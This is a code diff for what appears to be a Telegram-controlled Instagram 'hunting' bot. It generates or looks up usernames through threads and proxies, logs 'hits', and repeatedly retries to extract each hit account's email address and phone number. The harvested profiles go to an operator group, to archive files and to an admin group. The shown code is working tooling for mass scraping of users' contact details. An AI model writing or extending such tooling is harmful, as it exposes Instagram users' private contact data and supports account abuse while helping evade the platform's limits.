+            LEADERBOARD_MODE = "operators"
+            edit_panel_from_callback(
+                callback,
+                format_operator_leaderboard(),
+                panel_keyboard("leaderboard"),
+                toast="Global operators",
+            )
+        elif callback_data == "BADGES":
+            edit_panel_from_callback(
+                callback,
+                format_badges(),
+                panel_keyboard("profile"),
+                toast="Badges",
+            )
+        elif callback_data == "LB_OPS":
+            LEADERBOARD_MODE = "operators"
+            edit_panel_from_callback(
+                callback,
+                format_operator_leaderboard(),
+                panel_keyboard("leaderboard"),
+                toast="Operators",
+            )
+        elif callback_data == "LB_SESSIONS":
+            LEADERBOARD_MODE = "sessions"
+            edit_panel_from_callback(
+                callback,
+                format_session_leaderboard("all"),
+                panel_keyboard("leaderboard"),
+                toast="Sessions",
+            )
+        elif callback_data == "LB_DAY":
+            LEADERBOARD_MODE = "sessions"
+            edit_panel_from_callback(
+                callback,
+                format_session_leaderboard("day"),
+                panel_keyboard("leaderboard"),
+                toast="Today",
+            )
+        elif callback_data == "LB_WEEK":
+            LEADERBOARD_MODE = "sessions"
+            edit_panel_from_callback(
+                callback,
+                format_session_leaderboard("week"),
+                panel_keyboard("leaderboard"),
+                toast="This week",
+            )
+        elif callback_data == "LB_ALL":
+            LEADERBOARD_MODE = "sessions"
+            edit_panel_from_callback(
+                callback,
+                format_session_leaderboard("all"),
+                panel_keyboard("leaderboard"),
+                toast="All time",
+            )
+        elif callback_data == "TOOLS":
+            edit_panel_from_callback(
+                callback,
+                format_panel_header()
+                + f"<b>{S['btn_tools']} More</b>\n\n"
+                + f"<i>{S['bullet']} Analytics, health, ★ Saved, export, live refresh &amp; log out.</i>",
+                panel_keyboard("tools"),
+                toast="More" + (" · auto-refresh paused" if LIVE_WATCH else ""),
+            )
+        elif callback_data == "ANALYTICS":
+            edit_panel_from_callback(
+                callback,
+                format_analytics(),
+                panel_keyboard("analytics"),
+                toast="Analytics",
+            )
+        elif callback_data == "HEALTH":
+            edit_panel_from_callback(
+                callback,
+                format_health(),
+                panel_keyboard("health"),
+                toast="Health check",
+            )
+        elif callback_data == "EXPORT":
+            answer_callback(callback.get("id"), "Sending file…")
+            export_hits_archive()
+        elif callback_data == "SAVED":
+            answer_callback(callback.get("id"), "Sending favorites…")
+            export_saved_favorites()
+        elif callback_data == "LIVE_ON":
+            chat_id, message_id, _ = panel_message_from_callback(callback)
+            set_live_watch(True, chat_id, message_id)
+            edit_panel_from_callback(
+                callback,
+                format_stats(),
+                main_kb,
+                toast="Live ON — use Stats to view",
+            )
+        elif callback_data == "LIVE_OFF":
+            set_live_watch(False)
+            edit_panel_from_callback(
+                callback,
+                format_stats(),
+                main_kb,
+                toast="Auto-refresh OFF",
+            )
+        elif callback_data == "RESET_ASK":
+            edit_panel_from_callback(
+                callback,
+                format_reset_confirm(),
+                panel_keyboard("reset_confirm"),
+                toast="Confirm reset",
+            )
+        elif callback_data == "RESET_OK":
+            reset_session_stats()
+            edit_panel_from_callback(
+                callback,
+                format_action_notice("Stats reset", "Session counters cleared.", "RESET"),
+                panel_keyboard("notice"),
+                toast="Reset complete",
+                show_alert=True,
+            )
+        elif callback_data == "LOGOUT_ASK":
+            edit_panel_from_callback(
+                callback,
+                format_logout_confirm(),
+                panel_keyboard("logout_confirm"),
+                toast="Confirm logout",
+            )
+        elif callback_data == "LOGOUT_CANCEL":
+            edit_panel_from_callback(
+                callback,
+                format_stats(),
+                panel_keyboard("main"),
+                toast="Logout cancelled",
+            )
+        elif callback_data == "LOGOUT_OK":
+            ok, notice = cmd_logout_operator()
+            edit_panel_from_callback(
+                callback,
+                notice,
+                {"inline_keyboard": []},
+                toast="Logged out" if ok else "Logout failed",
+                show_alert=True,
+            )
+            if ok:
+                preserve_operator_hit_group_for_user()
+                finish_operator_logout_session()
+        elif callback_data == "MIND":
+            bump_min_followers(-5)
+            edit_panel_from_callback(
+                callback, format_settings(), panel_keyboard("settings"),
+                toast=f"Min → {MIN_FOLLOWERS}",
+            )
+        elif callback_data == "MINU":
+            bump_min_followers(5)
+            edit_panel_from_callback(
+                callback, format_settings(), panel_keyboard("settings"),
+                toast=f"Min → {MIN_FOLLOWERS}",
+            )
+        elif callback_data == "THRU":
+            bump_thread_count(5)
+            edit_panel_from_callback(
+                callback, format_settings(), panel_keyboard("settings"),
+                toast=f"Threads → {THREAD_COUNT}",
+            )
+        else:
+            answer_callback(callback.get("id"), "OK")
+    elif "message" in update:
+        message = update["message"]
+        chat = message.get("chat") or {}
+        chat_id = str(chat.get("id", ""))
+        chat_type = chat.get("type", "")
+        text = message.get("text", "") or ""
+        actor = telegram_actor_id(update)
+
+        if chat_type == "private":
+            if not can_control_operator_bot(actor) or str(actor) != str(chat_id):
+                return
+            if is_linked_operator(actor) and try_consume_favorite_note_input(text):
+                return
+            dispatch_bot_command(
+                normalize_bot_command_text(text),
+                actor,
+                chat_id=chat_id,
+                chat_type=chat_type,
+            )
+            return
+
+        if chat_type in ("group", "supergroup"):
+            if not can_control_operator_bot(actor):
+                return
+            norm = normalize_bot_command_text(text)
+            if not norm.startswith("/"):
+                return
+            dispatch_bot_command(
+                norm,
+                actor,
+                chat_id=chat_id,
+                chat_type=chat_type,
+            )
+
+
+def is_heavy_bot_command(text):
+    lower = normalize_bot_command_text(text or "").strip().lower()
+    return lower.startswith("/lookup") or lower.startswith("/gen")
+
+
+def telegram_send_typing(chat_id=None):
+    cid = str(chat_id or operator_reply_chat_id() or TELEGRAM_CHAT_ID or "")
+    if cid and TELEGRAM_ENABLED:
+        send_telegram_request("sendChatAction", data={"chat_id": cid, "action": "typing"})
+
+
+def _run_bot_command_safe(text, from_user_id, chat_id=None, chat_type="private"):
+    _set_operator_cmd_context(chat_id or TELEGRAM_CHAT_ID, chat_type, from_user_id)
+    try:
+        telegram_send_typing(chat_id or TELEGRAM_CHAT_ID)
+        result = process_bot_command(text, from_user_id)
+        if result is None:
+            log_event("TG CMD", f"no reply for {text[:40]!r}")
+            bot_command_reply(
+                format_action_notice(
+                    "No reply",
+                    "Command ran but Telegram send failed — check log.txt · retry.",
+                    "WARN",
+                ),
+                reply_markup=panel_keyboard("notice"),
+            )
+    except Exception as exc:
+        log_event("TG CMD", str(exc)[:120])
+        append_error_log("TG CMD", str(exc))
+        bot_command_reply(
+            format_action_notice("Command error", str(exc)[:100], "ERR"),
+            remove_markup=True,
+        )
+    finally:
+        _clear_operator_cmd_context()
+
+
+def process_hit_group_group_command(command, from_user_id, group_chat_id):
+    """Hit-group setup in the group itself (DM inbox ignores group messages)."""
+    op = str(TELEGRAM_CHAT_ID or "").strip()
+    actor = str(from_user_id or "").strip()
+    group_chat_id = str(group_chat_id or "").strip()
+    if not op or not group_chat_id:
+        return None
+    if not can_control_operator_bot(actor):
+        return bot_command_reply(
+            format_action_notice(
+                "Hit group",
+                "Only the linked operator or admin can run this in the group.",
+                "WARN",
+            ),
+            chat_id=group_chat_id,
+        )
+    head = _telegram_command_head(command)
+    lower = (command or "").strip().lower()
+    if head in ("/hitgroup", "/setgroup") or lower in ("hitgroup", "setgroup"):
+        return bot_command_reply(
+            format_hit_group_setup_message(),
+            reply_markup=hit_group_gate_keyboard(),
+            chat_id=group_chat_id,
+        )
+    if head == "/verifyhitgroup" or lower in ("verifyhitgroup",):
+        ok, msg = verify_operator_hit_group_access(fast=True, group_id=group_chat_id)
+        if ok:
+            return bot_command_reply(
+                format_action_notice("Hit group verified", msg, "OK"),
+                reply_markup=panel_keyboard("notice"),
+                chat_id=group_chat_id,
+            )
+        reason = "not_admin" if get_operator_hit_group_id() else "no_hit_group"
+        body = msg if isinstance(msg, str) and "<b>" in msg else format_hit_group_gate_message(reason)
+        return bot_command_reply(body, reply_markup=hit_group_gate_keyboard(), chat_id=group_chat_id)
+    return None
+
+
+def _run_hit_group_group_command_safe(text, from_user_id, group_chat_id):
+    try:
+        process_hit_group_group_command(text, from_user_id, group_chat_id)
+    except Exception as exc:
+        log_event("TG HITGRP", str(exc)[:120])
+        bot_command_reply(
+            format_action_notice("Hit group error", str(exc)[:100], "ERR"),
+            chat_id=group_chat_id,
+        )
+
+
+FAST_ACK_COMMANDS = {
+    "/start": ("Loading", "Opening welcome panel…"),
+    "/check": ("Checking", "Running full health diagnostic…"),
+    "/verifyhitgroup": ("Verifying", "Checking bot admin rights in this group…"),
+    "/hitgroup": ("Hit group", "Opening setup guide…"),
+    "/setgroup": ("Hit group", "Opening setup guide…"),
+}
+
+
+def _poll_instant_command_ack(update):
+    """Fire ack on poll thread before any queue — user sees reply in ~1s."""
+    if "message" not in update:
+        return
+    message = update["message"]
+    text = message.get("text", "") or ""
+    norm = normalize_bot_command_text(text)
+    if not norm.startswith("/"):
+        return
+    head = _telegram_command_head(norm)
+    pair = FAST_ACK_COMMANDS.get(head)
+    if not pair:
+        return
+    chat = message.get("chat") or {}
+    chat_id = str(chat.get("id", ""))
+    chat_type = chat.get("type", "")
+    actor = telegram_actor_id(update)
+    _set_operator_cmd_context(chat_id, chat_type, actor)
+    try:
+        resp = send_telegram_instant(
+            format_action_notice(pair[0], pair[1], "INFO"),
+            chat_id=chat_id,
+        )
+        if head == "/start":
+            _stash_startup_loading_message(chat_id, resp)
+    finally:
+        _clear_operator_cmd_context()
+
+
+def _handle_telegram_update_safe(update):
+    try:
+        handle_telegram_update(update)
+    except Exception as exc:
+        log_event("TG HANDLER", str(exc)[:120])
+
+
+def _dispatch_instant_command_ack(text, reply_cid, chat_type, from_user_id):
+    """Legacy hook — instant acks are sent on the poll thread (_poll_instant_command_ack)."""
+    return
+
+
+def dispatch_bot_command(text, from_user_id=None, *, chat_id=None, chat_type="private"):
+    """Fast commands use tgfast pool; lookup/gen use tgcmd so they never block verify/start."""
+    reply_cid = chat_id or TELEGRAM_CHAT_ID
+    executor = _tg_cmd_executor if is_heavy_bot_command(text) else _tg_fast_executor
+    if is_heavy_bot_command(text):
+        _set_operator_cmd_context(reply_cid, chat_type, from_user_id)
+        try:
+            bot_command_reply(
+                format_action_notice(
+                    "Processing",
+                    "Lookup/gen running — bot stays online. Wait a few seconds…",
+                    "INFO",
+                ),
+                reply_markup=panel_keyboard("notice"),
+                chat_id=reply_cid,
+            )
+        finally:
+            _clear_operator_cmd_context()
+    executor.submit(
+        _run_bot_command_safe, text, from_user_id, reply_cid, chat_type,
+    )
+
+
+def poll_telegram_updates():
+    global LAST_UPDATE_ID
+    while TELEGRAM_ENABLED:
+        try:
+            response = telegram_poll_get_updates(LAST_UPDATE_ID + 1)
+            if response is None or not response.ok:
+                time.sleep(BOT_POLL_INTERVAL)
+                continue
+            payload = response.json()
+            if not payload.get("ok"):
+                err = payload.get("description", "")
+                if "Conflict" in str(err) or response.status_code == 409:
+                    log_event(
+                        "TG POLL",
+                        "409 conflict — stop other joint.py copies; BotFather webhook OFF",
+                    )
+                time.sleep(BOT_POLL_INTERVAL)
+                continue
+            updates = payload.get("result", [])
+            for update in updates:
+                LAST_UPDATE_ID = max(LAST_UPDATE_ID, update["update_id"])
+                _poll_instant_command_ack(update)
+                _tg_fast_executor.submit(_handle_telegram_update_safe, update)
+        except Exception as exc:
+            log_event("TG POLL", str(exc)[:120])
+            time.sleep(BOT_POLL_INTERVAL)
+
+
+def report(username, info):
+    try:
+        _report_impl(username, info)
+    except Exception as exc:
+        log_event("HIT REPORT", f"@{username} {str(exc)[:100]}")
+        append_error_log("HIT REPORT", str(exc), f"user=@{username}")
+
+
+def _hit_enrich_minimal_finalize(username, info):
+    """Fast path when enrich pool is saturated — upgrade group alert if already sent."""
+    info = dict(info or {})
+    contact_details = _hit_contact_seed_from_info(info)
+    try:
+        contact_details = _fetch_hit_contact_wbloks(username, info)
+    except Exception as exc:
+        log_event("HIT ENRICH", f"@{username} minimal contact {str(exc)[:60]}")
+    caption, keyboard, photo_bytes, content_type, quality_stars, name, posts_display, contact_details = (
+        _compose_hit_group_message(username, info, contact_details)
+    )
+    delivered, msg_id, is_photo, _tg_mode = _hit_upgrade_group_message(
+        username, caption, keyboard, photo_bytes, content_type,
+    )
+    if not delivered:
+        _hit_tg_rate_wait()
+        delivered, msg_id, is_photo = deliver_hit_to_operator_group(
+            caption, keyboard, photo_bytes, content_type,
+        )
+    if not delivered:
+        _enqueue_hit_tg_retry(username, caption, keyboard, photo_bytes, content_type)
+    elif msg_id:
+        gid = get_operator_hit_group_id()
+        if gid:
+            _hit_tg_cache_put(username, gid, msg_id, is_photo)
+    timestamp = datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")
+    profile_url = f"https://www.instagram.com/{html.escape(username)}"
+    _write_hit_file_entry(
+        username, name,
+        info.get("follower_count", "N/A"),
+        info.get("following_count", "N/A"),
+        posts_display,
+        _format_hit_quality_display(quality_stars),
+        contact_details, profile_url, timestamp,
+    )
+    log_event("HIT ENRICH", f"@{username} minimal finalize · TG queued/sent")
+
+
+def _queue_hit_archive_side_effects(
+    username, info, contact_details, profile_url, timestamp,
+    quality_stars, quality_display, name, posts_display,
+    caption_final, photo_bytes, content_type,
+):
+    """File/cloud/admin off hot path — never blocks TG edit or hunt."""
+    payload = (
+        username, dict(info or {}), dict(contact_details or {}),
+        profile_url, timestamp, quality_stars, quality_display,
+        name, posts_display, caption_final, photo_bytes, content_type,
+    )
+
+    def _run():
+        try:
+            _hit_archive_side_effects_impl(*payload)
+        except Exception as exc:
+            log_event("HIT FILE", f"@{username} archive {str(exc)[:60]}")
+
+    try:
+        _hit_upgrade_executor.submit(_run)
+    except Exception:
+        threading.Thread(
+            target=_run, daemon=True, name=f"hit-arch-{username[:8]}",
+        ).start()
+
+
+def _hit_archive_side_effects_impl(
+    username, info, contact_details, profile_url, timestamp,
+    quality_stars, quality_display, name, posts_display,
+    caption_final, photo_bytes, content_type,
+):
+    _write_hit_file_entry(
+        username, name,
+        info.get("follower_count", "N/A"),
+        info.get("following_count", "N/A"),
+        posts_display,
+        quality_display, contact_details, profile_url, timestamp,
+    )
+    profile_record_hit_quality(quality_stars)
+    if TELEGRAM_ENABLED:
+        _queue_hit_admin_notify(
+            username, caption_final, photo_bytes, content_type, info,
+        )
+
+
+def _hit_deliver_and_archive(username, info, contact_details, profile_url, timestamp):
+    """TG pool — caption edit only; archive/cloud deferred."""
+    info = dict(info or {})
+    contact_details = dict(contact_details or {})
+    caption_final, hit_keyboard, photo_bytes, content_type, quality_stars, name, posts_display, contact_details = (
+        _compose_hit_group_message(username, info, contact_details)
+    )
+    quality_display = _format_hit_quality_display(quality_stars)
+
+    delivered, msg_id, is_photo, tg_mode = _hit_upgrade_group_message(
+        username, caption_final, hit_keyboard, photo_bytes, content_type,
+    )
+    if not delivered:
+        delivered, msg_id, is_photo = _deliver_hit_group_guaranteed(
+            username, info, contact_details,
+        )
+        tg_mode = "new" if delivered else "fail"
+    if delivered and msg_id:
+        gid = get_operator_hit_group_id()
+        if gid:
+            _hit_tg_cache_put(username, gid, msg_id, is_photo)
+        if tg_mode == "edited":
+            log_event("HIT TG", f"@{username} edited · group")
+        elif tg_mode == "unchanged":
+            log_event("HIT TG", f"@{username} same caption · deep pending")
+        elif tg_mode == "resent":
+            log_event("HIT TG", f"@{username} resent · group")
+        else:
+            log_event("HIT TG", f"@{username} enriched · group")
+    else:
+        log_event("HIT FAIL", f"@{username} group send queued for retry")
+
+    log_event("HIT ENRICH", f"@{username} done · {quality_display}")
+    _queue_hit_archive_side_effects(
+        username, info, contact_details, profile_url, timestamp,
+        quality_stars, quality_display, name, posts_display,
+        caption_final, photo_bytes, content_type,
+    )
+
+
+def _queue_hit_pfp_upgrade(username, info, msg_id, caption, keyboard, is_photo, photo_bytes):
+    def _run():
+        pfp = _profile_pic_url_from_ig_info(info, username) or "N/A"
+        if pfp == "N/A" or not photo_bytes:
+            return
+        try:
+            if _IS_TERMUX:
+                full_photo, full_ctype = _quick_hit_pfp_bytes(pfp)
+            else:
+                full_photo, full_ctype, _ = _fetch_hit_profile_photo_bytes(
+                    username, info, pfp,
+                )
+            if full_photo:
+                _finalize_hit_operator_delivery(
+                    get_operator_hit_group_id(), msg_id, caption,
+                    keyboard, is_photo, full_photo, full_ctype,
+                )
+        except Exception as exc:
+            log_event("PFP FETCH", f"@{username} async {str(exc)[:60]}")
+
+    try:
+        _hit_upgrade_executor.submit(_run)
+    except Exception:
+        threading.Thread(target=_run, daemon=True, name=f"hit-pfp-{username[:8]}").start()
+
+
+def _queue_hit_admin_notify(username, caption, photo_bytes, content_type, info):
+    def _run():
+        try:
+            admin_load_settings()
+            admin_forward_hit_to_group(
+                caption,
+                photo_bytes=photo_bytes,
+                content_type=content_type,
+                operator_id=resolve_operator_id(TELEGRAM_CHAT_ID),
+            )
+            admin_notify_hit_summary(
+                username,
+                info.get("follower_count", "N/A"),
+                info.get("following_count", "N/A"),
+                operator_id=resolve_operator_id(TELEGRAM_CHAT_ID),
+            )
+        except Exception as exc:
+            log_event("ADMIN HIT", str(exc)[:80])
+
+    try:
+        _hit_upgrade_executor.submit(_run)
+    except Exception:
+        threading.Thread(target=_run, daemon=True, name=f"hit-admin-{username[:8]}").start()
+
+
+def _queue_hit_deep_when_idle(username, info, contact_details, profile_url, timestamp):
+    """Hold deep enrich until hunt cools — avoids proxy/graphql stalls during gen."""
+    row = {
+        "username": username,
+        "info": dict(info or {}),
+        "contact_details": dict(contact_details or {}),
+        "profile_url": profile_url,
+        "timestamp": timestamp,
+        "at": time.time(),
+    }
+    with _hit_deep_idle_lock:
+        if len(_hit_deep_idle_queue) >= 40:
+            _hit_deep_idle_queue.pop(0)
+        _hit_deep_idle_queue.append(row)
+    log_event("HIT ENRICH", f"@{username} deep held — hunt active")
+
+
+def _queue_hit_contact_retry(username, info, contact_details, profile_url, timestamp):
+    """Re-run wbloks when enrich missed contacts — keep going through network blips."""
+    payload = (username, dict(info or {}), dict(contact_details or {}), profile_url, timestamp)
+
+    def _run():
+        uname, ig_info, details, purl, ts = payload
+        merged = dict(details)
+        time.sleep(_HIT_CONTACT_BG_RETRY_SLEEP_SEC)
+        last_err = None
+        for attempt in range(1, _HIT_CONTACT_BG_RETRY_ATTEMPTS + 1):
+            try:
+                fresh = _fetch_hit_contact_wbloks(uname, ig_info)
+                if fresh.get("email"):
+                    merged["email"] = fresh["email"]
+                if fresh.get("phone"):
+                    merged["phone"] = fresh["phone"]
+                if not merged.get("joined"):
+                    joined = _joined_year_from_ig_info(ig_info)
+                    if joined:
+                        merged["joined"] = joined
+                if merged.get("email") or merged.get("phone"):
+                    _schedule_hit_tg_deliver(uname, ig_info, merged, purl, ts)
+                    log_event(
+                        "HIT ENRICH",
+                        f"@{uname} contact retry #{attempt} · upgraded",
+                    )
+                    return
+                if attempt < _HIT_CONTACT_BG_RETRY_ATTEMPTS:
+                    wait = _HIT_CONTACT_BG_RETRY_SLEEP_SEC
+                    log_event(
+                        "HIT ENRICH",
+                        f"@{uname} contact retry #{attempt} empty · wait {wait:.0f}s",
+                    )
+                    time.sleep(wait)
+            except Exception as exc:
+                last_err = str(exc)[:80]
+                log_event("HIT ENRICH", f"@{uname} contact retry #{attempt} {last_err}")
+                if attempt < _HIT_CONTACT_BG_RETRY_ATTEMPTS:
+                    time.sleep(_HIT_CONTACT_BG_RETRY_SLEEP_SEC)
+        log_event(
+            "HIT ENRICH",
+            f"@{uname} contact retry exhausted · delivering partial "
+            f"({last_err or 'no_contact'})",
+        )
+        _schedule_hit_tg_deliver(uname, ig_info, merged, purl, ts)
+
+    try:
+        _hit_upgrade_executor.submit(_run)
+    except Exception:
+        threading.Thread(target=_run, daemon=True, name=f"hit-ctretry-{username[:8]}").start()
+
+
+def _drain_hit_deep_idle_queue(max_items=2):
+    """Run queued deep enriches; contact retries proceed even during active hunt."""
+    batch = []
+    with _hit_deep_idle_lock:
+        idx = 0
+        while idx < len(_hit_deep_idle_queue) and len(batch) < max_items:
+            row = _hit_deep_idle_queue[idx]
+            cd = row.get("contact_details") or {}
+            need_contact = not (cd.get("email") or cd.get("phone"))
+            if _hunt_gen_recently_active(90) and not need_contact:
+                idx += 1
+                continue
+            batch.append(_hit_deep_idle_queue.pop(idx))
+    for row in batch:
+        try:
+            _hit_upgrade_executor.submit(
+                _hit_deep_enrich_upgrade,
+                row["username"],
+                row["info"],
+                row["contact_details"],
+                row["profile_url"],
+                row["timestamp"],
+            )
+        except Exception as exc:
+            log_event("HIT BG", f"@{row['username']} deep drain {str(exc)[:60]}")
+
+
+def _hit_deep_enrich_upgrade(username, info, contact_details, profile_url, timestamp):
+    """Slow mobile/posts enrich — upgrades an already-delivered group alert."""
+    if _hunt_gen_recently_active(90):
+        _queue_hit_deep_when_idle(username, info, contact_details, profile_url, timestamp)
+        return
+    info = dict(info or {})
+    contact_details = dict(contact_details or {})
+    need_mobile = not (contact_details.get("email") and contact_details.get("phone"))
+    need_posts = _posts_count_from_ig_info(info) is None
+    if not need_mobile and not need_posts:
+        return
+    mobile_timeout = 50 if _IS_TERMUX else 90
+    posts_timeout = 40 if _IS_TERMUX else 45
+    try:
+        with ThreadPoolExecutor(max_workers=2) as deep_pool:
+            futures = {}
+            if need_mobile:
+                futures["mobile"] = deep_pool.submit(
+                    _fetch_hit_contact_mobile, username, info, contact_details,
+                )
+            if need_posts:
+                futures["posts"] = deep_pool.submit(
+                    _resolve_hit_posts_count, username, dict(info),
+                )
+            if "mobile" in futures:
+                try:
+                    contact_details = (
+                        futures["mobile"].result(timeout=mobile_timeout) or contact_details
+                    )
+                except Exception as exc:
+                    log_event("HIT BG", f"@{username} mobile {str(exc)[:60]}")
+            if "posts" in futures:
+                try:
+                    info = futures["posts"].result(timeout=posts_timeout) or info
+                except Exception as exc:
+                    log_event("HIT ENRICH", f"@{username} posts {str(exc)[:80]}")
+    except Exception as exc:
+        log_event("HIT ENRICH", f"@{username} deep {str(exc)[:80]}")
+    if not contact_details.get("joined"):
+        joined = _joined_year_from_ig_info(info)
+        if joined:
+            contact_details["joined"] = joined
+    try:
+        _schedule_hit_tg_deliver(
+            username, dict(info), dict(contact_details), profile_url, timestamp,
+        )
+    except Exception as exc:
+        log_event("HIT BG", f"@{username} deep upgrade {str(exc)[:60]}")
+
+
+def _hit_full_upgrade_pipeline(username, info):
+    """All enrich + TG upgrade on dedicated pool — never competes with active hunt."""
+    info = dict(info or {})
+    info = _merge_ig_info_profile_fields(info, username)
+    profile_url = f"https://www.instagram.com/{html.escape(username)}"
+    timestamp = datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")
+    contact_details = _hit_contact_seed_from_info(info)
+    light_only = _hit_pipeline_light_only()
+    hunt_sem_held = False
+    if light_only:
+        hunt_sem_held = _hit_during_hunt_sem.acquire(blocking=True, timeout=60)
+        if not hunt_sem_held:
+            log_event("HIT ENRICH", f"@{username} deferred — hunt priority")
+            try:
+                threading.Timer(
+                    3.0,
+                    lambda u=username, i=dict(info): _queue_hit_upgrade_pipeline(u, i),
+                ).start()
+            except Exception:
+                pass
+            return
+    skip_gw = not _IS_TERMUX
+    profile_timeout = min(_HIT_PROFILE_SYNC_TIMEOUT, 8 if not _IS_TERMUX else _HIT_PROFILE_SYNC_TIMEOUT)
+
+    try:
+        if light_only:
+            info = _merge_ig_info_profile_fields(info, username)
+            if _posts_count_from_ig_info(info) is None:
+                try:
+                    info = _resolve_hit_posts_count(username, info, max_rounds=1)
+                except Exception as exc:
+                    log_event("HIT ENRICH", f"@{username} posts {str(exc)[:80]}")
+            if hunt_sem_held:
+                _hit_during_hunt_sem.release()
+                hunt_sem_held = False
+            try:
+                contact_details = (
+                    _fetch_hit_contact_direct_then_proxy(username, info, hunt_slot=True)
+                    or contact_details
+                )
+            except Exception as exc:
+                log_event("HIT ENRICH", f"@{username} contact {str(exc)[:80]}")
+        else:
+            contact_timeout = _HIT_CONTACT_SYNC_TIMEOUT
+            try:
+                with ThreadPoolExecutor(max_workers=2) as enrich_pool:
+                    fut_contact = enrich_pool.submit(_fetch_hit_contact_fast, username, info)
+                    fut_profile = enrich_pool.submit(
+                        _enrich_hit_profile_light, username, info, skip_gateway=skip_gw,
+                    )
+                    try:
+                        contact_details = fut_contact.result(timeout=contact_timeout) or contact_details
+                    except Exception as exc:
+                        log_event("HIT ENRICH", f"@{username} contact {str(exc)[:100]}")
+                    try:
+                        info = fut_profile.result(timeout=profile_timeout) or info
+                    except Exception as exc:
+                        log_event("HIT ENRICH", f"@{username} profile {str(exc)[:100]}")
+            except Exception as exc:
+                log_event("HIT ENRICH", f"@{username} parallel {str(exc)[:100]}")
+
+        if not contact_details.get("joined"):
+            joined = _joined_year_from_ig_info(info)
+            if joined:
+                contact_details["joined"] = joined
+
+        need_contact = not (contact_details.get("email") or contact_details.get("phone"))
+        if need_contact:
+            log_event("HIT ENRICH", f"@{username} ready — contact retry queued")
+            _queue_hit_contact_retry(username, info, contact_details, profile_url, timestamp)
+        else:
+            log_event("HIT ENRICH", f"@{username} ready — upgrading group alert")
+            _schedule_hit_tg_deliver(username, info, contact_details, profile_url, timestamp)
+
+        need_mobile = not (contact_details.get("email") and contact_details.get("phone"))
+        need_posts = _posts_count_from_ig_info(info) is None
+        if need_mobile or need_posts:
+            if light_only or _hunt_gen_recently_active(90):
+                _queue_hit_deep_when_idle(
+                    username, info, contact_details, profile_url, timestamp,
+                )
+            else:
+                try:
+                    _hit_upgrade_executor.submit(
+                        _hit_deep_enrich_upgrade,
+                        username, dict(info), dict(contact_details), profile_url, timestamp,
+                    )
+                except Exception as exc:
+                    log_event("HIT BG", f"@{username} deep submit {str(exc)[:60]}")
+    finally:
+        if hunt_sem_held:
+            _hit_during_hunt_sem.release()
+
+
+def _queue_hit_upgrade_pipeline(username, info):
+    try:
+        _hit_upgrade_executor.submit(_hit_full_upgrade_pipeline, username, dict(info or {}))
+    except Exception as exc:
+        log_event("HIT BG", f"@{username} upgrade queue {str(exc)[:60]}")
+        try:
+            threading.Thread(
+                target=_hit_full_upgrade_pipeline,
+                args=(username, dict(info or {})),
+                daemon=True,
+                name=f"hit-upg-{username[:10]}",
+            ).start()
+        except Exception as exc2:
+            log_event("HIT BG", f"@{username} upgrade fallback {str(exc2)[:60]}")
+
+
+def _hit_enrich_finalize_background(username, info):
+    """Thin dispatcher — all work runs on hitupgrade pool."""
+    _queue_hit_upgrade_pipeline(username, info)
+
+
+def _report_impl(username, info):
+    """Instant hit + stats; TG/enrich/pfp fully in background — hunt never waits."""
+    global hit
+    info = _merge_ig_info_profile_fields(info, username)
+    followers = info.get("follower_count", "N/A")
+    posts_raw = _posts_count_from_ig_info(info)
+    posts_display = str(posts_raw) if posts_raw is not None else "N/A"
+
+    with lock:
+        hit += 1
+    event_message = f"HIT @{username} | {followers} followers | {posts_display} posts"
+    log_event("HIT", event_message)
+    if not JACK_PANEL_LIVE:
+        print(apply_color(event_message, ANSI_GREEN))
+
+    _queue_hit_tg_chain(username, info)
+
+    try:
+        _hit_report_executor.submit(_write_hit_session_basic, username, dict(info or {}))
+    except Exception as exc:
+        log_event("HIT FILE", f"@{username} session save {str(exc)[:60]}")
+
+    def _profile_side_effects():
+        try:
+            profile_record_hit()
+            maybe_send_milestone_alert()
+        except Exception as exc:
+            log_event("HIT STATS", str(exc)[:80])
+
+    try:
+        _hit_upgrade_executor.submit(_profile_side_effects)
+    except Exception as exc:
+        log_event("HIT STATS", str(exc)[:80])
+
+
+def log_event(event_type, message):
+    if not _operator_log_event_visible(event_type):
+        return
+    timestamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
+    entry = f"[{timestamp}] {event_type}: {message}"
+    with event_log_lock:
+        event_log.append(entry)
+        if len(event_log) > MAX_EVENTS:
+            event_log.pop(0)
+    if event_type == "HIT FAIL":
+        pass
+    elif (
+        "FAIL" in event_type
+        or event_type in ("TG ERR", "ERROR", "CLOUD", "PFP FETCH")
+    ):
+        append_error_log(event_type, message)
+
+
+def _panel_enter_alt_screen():
+    """Dedicated TUI buffer — no scrollback ghost lines above the panel."""
+    global _panel_alt_screen
+    if _panel_alt_screen:
+        return
+    sys.stdout.write("\033[?1049h\033[2J\033[H\033[?25l")
+    sys.stdout.flush()
+    _panel_alt_screen = True
+
+
+def _panel_leave_alt_screen():
+    global _panel_alt_screen, _panel_live_drawn_once
+    if not _panel_alt_screen:
+        return
+    sys.stdout.write("\033[?25h\033[?1049l")
+    sys.stdout.flush()
+    _panel_alt_screen = False
+    _panel_live_drawn_once = False
+
+
+def clear_console():
+    if _panel_alt_screen:
+        sys.stdout.write("\033[2J\033[H")
+        sys.stdout.flush()
+        return
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        sys.stdout.write("\033[2J\033[H")
+        sys.stdout.flush()
+
+
+def format_duration(seconds):
+    seconds = int(seconds)
+    hrs, rem = divmod(seconds, 3600)
+    mins, secs = divmod(rem, 60)
+    return f"{hrs:02d}:{mins:02d}:{secs:02d}"
+
+
+def make_bar(current, total, width=30, char="▰"):
+    if total == 0:
+        return "─" * width
+    filled = int((current / total) * width)
+    return (char * filled) + ("─" * (width - filled))
+
+
+def _build_dashboard_frame(
+    uptime,
+    generated,
+    valid_count,
+    hits_count,
+    error_count,
+    events,
+    *,
+    show_logo,
+):
+    """Build full panel off-screen — never clear terminal until frame is ready."""
+    success_pct = (valid_count / generated * 100) if generated else 0
+    hit_pct = (hits_count / generated * 100) if generated else 0
+    valid_pct = (hits_count / valid_count * 100) if valid_count else 0
+
+    if JACK_PANEL_LIVE:
+        live_snap = _hunt_health_snapshot(live=True)
+        status_text = live_snap["status_text"]
+        status_color = live_snap["status_color"]
+    else:
+        live_snap = None
+        block = hunt_block_reason()
+        if block:
+            status_text = block[:22].upper()
+            status_color = ANSI_YELLOW if "API" not in block else ANSI_RED
+        elif _api_auto_paused and not _user_manual_paused and not _hunt_recently_ok():
+            status_text = "API OFF"
+            status_color = ANSI_RED
+        elif paused:
